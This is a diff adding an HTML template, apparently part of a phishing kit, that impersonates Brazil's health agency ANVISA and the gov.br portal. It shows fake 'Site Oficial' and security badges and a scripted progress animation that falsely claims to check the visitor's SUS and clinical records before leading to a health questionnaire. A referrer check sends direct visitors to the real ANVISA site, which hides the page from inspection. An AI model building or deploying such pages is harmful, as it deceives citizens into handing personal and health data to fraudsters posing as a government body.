@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>Validação em Andamento - ANVISA</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+  <style>
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+      font-weight: 500;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+      font-weight: 600;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
+      font-weight: 700;
+      font-style: normal;
+    }
+    
+    body {
+      font-family: 'Rawline', sans-serif;
+      background-color: #f8f9fa;
+    }
+    
+    .main-title {
+      font-size: 1.4rem;
+      line-height: 2rem;
+      font-weight: 600;
+      color: #0c326f;
+      padding-bottom: 10px;
+      margin: 0;
+    }
+    
+    .subtitle {
+      font-weight: 400;
+      font-size: 16px;
+      color: #555;
+      line-height: normal;
+      margin-bottom: 10px;
+    }
+    
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 1000;
+      transition: box-shadow 0.3s ease;
+    }
+    
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .secure-badge {
+      background-color: #e6f3e6;
+      padding: 5px 10px;
+      border-radius: 5px;
+      font-size: 12px;
+      color: #2e7d32;
+      display: inline-flex;
+      align-items: center;
+      margin-right: 8px;
+    }
+    
+    .secure-badge i {
+      margin-right: 4px;
+    }
+    
+    .validation-container {
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+      margin: 20px auto;
+      max-width: 500px;
+    }
+    
+    .progress-container {
+      width: 100%;
+      margin-bottom: 32px;
+    }
+    
+    .progress-bar {
+      height: 8px;
+      border-radius: 4px;
+      background-color: #e0e0e0;
+      margin-top: 8px;
+      overflow: hidden;
+    }
+    
+    .progress-fill {
+      height: 100%;
+      background-color: #1351b4;
+      width: 0%;
+      transition: width 1s ease;
+    }
+    
+    .loading-step {
+      display: flex;
+      align-items: center;
+      margin-bottom: 24px;
+      opacity: 0.4;
+      transition: opacity 0.5s ease;
+    }
+    
+    .loading-step.active {
+      opacity: 1;
+    }
+    
+    .loading-step.completed .step-icon {
+      background-color: #e6f0ea;
+    }
+    
+    .step-icon {
+      min-width: 48px;
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #e3f2fd;
+      margin-right: 16px;
+    }
+    
+    .step-content {
+      flex: 1;
+    }
+    
+    .step-title {
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 4px;
+    }
+    
+    .step-description {
+      font-size: 14px;
+      color: #666;
+    }
+    
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Validação em Andamento</span>
+      </div>
+    </div>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Validação de Dados em Andamento
+      </h2>
+      <p class="subtitle">
+        Aguarde enquanto verificamos seus dados nos sistemas oficiais.
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-database"></i> Dados Protegidos</span>
+    </div>
+    
+    <div class="validation-container">
+      <h3 class="text-lg font-semibold text-center text-[#0c326f] mb-4">Verificação em Progresso</h3>
+      
+      <!-- Barra de progresso -->
+      <div class="progress-container">
+        <div class="flex justify-between text-sm text-gray-600">
+          <span>0%</span>
+          <span id="progressPercentage">0%</span>
+          <span>100%</span>
+        </div>
+        <div class="progress-bar">
+          <div id="progressFill" class="progress-fill"></div>
+        </div>
+      </div>
+      
+      <!-- Etapas de carregamento -->
+      <div id="loadingSteps">
+        <!-- As etapas são adicionadas dinamicamente pelo JavaScript -->
+        <div id="step1" class="loading-step active">
+          <div class="step-icon">
+            <i id="icon1" class="fas fa-circle-notch fa-spin text-[#1351b4]"></i>
+          </div>
+          <div class="step-content">
+            <div class="step-title">Verificando Histórico Clínico</div>
+            <div class="step-description">Consultando bases de dados da ANVISA</div>
+          </div>
+        </div>
+        
+        <div id="step2" class="loading-step">
+          <div class="step-icon">
+            <i id="icon2" class="fas fa-circle-notch text-[#1351b4] opacity-50"></i>
+          </div>
+          <div class="step-content">
+            <div class="step-title">Consultando Registros no SUS</div>
+            <div class="step-description">Verificando histórico médico e elegibilidade</div>
+          </div>
+        </div>
+        
+        <div id="step3" class="loading-step">
+          <div class="step-icon">
+            <i id="icon3" class="fas fa-circle-notch text-[#1351b4] opacity-50"></i>
+          </div>
+          <div class="step-content">
+            <div class="step-title">Validando Prescrição com a Anvisa</div>
+            <div class="step-description">Conferindo registros de medicamentos prescritos</div>
+          </div>
+        </div>
+        
+        <div id="step4" class="loading-step">
+          <div class="step-icon">
+            <i id="icon4" class="fas fa-circle-notch text-[#1351b4] opacity-50"></i>
+          </div>
+          <div class="step-content">
+            <div class="step-title">Obtendo Dados de Saúde Complementares</div>
+            <div class="step-description">Preparando recomendações personalizadas</div>
+          </div>
+        </div>
+      </div>
+      
+      <div id="completionMessage" class="hidden mt-8 text-center">
+        <div class="bg-green-50 p-4 rounded-lg mb-4">
+          <i class="fas fa-check-circle text-green-600 text-3xl mb-2"></i>
+          <h3 class="text-lg font-semibold text-green-700">Verificação Concluída</h3>
+          <p class="text-sm text-green-700">Suas informações foram validadas com sucesso!</p>
+        </div>
+        <button id="continueButton" class="mt-4 bg-[#1351b4] text-white px-6 py-3 rounded-lg font-semibold hover:bg-[#0c3d8a] transition-all">
+          Continuar para o Questionário
+        </button>
+      </div>
+    </div>
+    
+    <div class="bg-white p-4 rounded-lg shadow-sm mt-6">
+      <p class="font-bold text-gray-700 text-base mb-2">
+        <i class="fas fa-shield-alt text-green-600 mr-2"></i>
+        Sistema de Verificação Segura
+      </p>
+      <p class="text-gray-700 text-sm">
+        A verificação de identidade é realizada utilizando conexão criptografada e todos os seus dados são processados com os mais altos padrões de segurança em conformidade com a Lei Geral de Proteção de Dados (LGPD).
+      </p>
+    </div>
+  </main>
+  
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+  
+  <script>
+    // Verificação de segurança, permitir acesso apenas a partir da página de validação
+    function checkAccess() {
+      const validReferrers = ['validar-dados', 'anvisa.gov.br'];
+      const referer = document.referrer;
+      
+      let isValidReferer = false;
+      for (const validRef of validReferrers) {
+        if (referer.includes(validRef)) {
+          isValidReferer = true;
+          break;
+        }
+      }
+      
+      if (!isValidReferer && !localStorage.getItem('cpfValidado')) {
+        window.location.href = "https://www.gov.br/anvisa/pt-br";
+      }
+    }
+    
+    // Simulação das etapas de verificação
+    let currentStep = 1;
+    let progress = 0;
+    const totalSteps = 4;
+    
+    function updateProgress(value) {
+      document.getElementById('progressFill').style.width = `${value}%`;
+      document.getElementById('progressPercentage').textContent = `${Math.round(value)}%`;
+    }
+    
+    function processNextStep() {
+      if (currentStep <= totalSteps) {
+        // Atualizar progresso
+        progress = (currentStep - 1) / totalSteps * 100;
+        updateProgress(progress);
+        
+        // Definir a etapa atual como ativa
+        document.getElementById(`step${currentStep}`).classList.add('active');
+        document.getElementById(`icon${currentStep}`).classList.add('fa-spin');
+        
+        // Simular processamento desta etapa
+        setTimeout(() => {
+          // Marcar etapa como concluída
+          document.getElementById(`icon${currentStep}`).classList.remove('fa-circle-notch', 'fa-spin');
+          document.getElementById(`icon${currentStep}`).classList.add('fa-check-circle', 'text-green-600');
+          document.getElementById(`step${currentStep}`).classList.add('completed');
+          
+          // Avançar para a próxima etapa
+          currentStep++;
+          
+          // Se ainda houver etapas, processar a próxima
+          if (currentStep <= totalSteps) {
+            processNextStep();
+          } else {
+            // Finalizar o processo
+            progress = 100;
+            updateProgress(progress);
+            
+            setTimeout(() => {
+              document.getElementById('completionMessage').classList.remove('hidden');
+            }, 1000);
+          }
+        }, 3500);
+      }
+    }
+    
+    window.onload = function() {
+      checkAccess();
+      
+      // Iniciar a animação
+      setTimeout(() => {
+        processNextStep();
+      }, 1200);
+      
+      // Botão "Continuar" redireciona para a página do questionário
+      document.getElementById('continueButton').addEventListener('click', function() {
+        window.location.href = "/questionario-saude";
+      });
+    }
+    
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
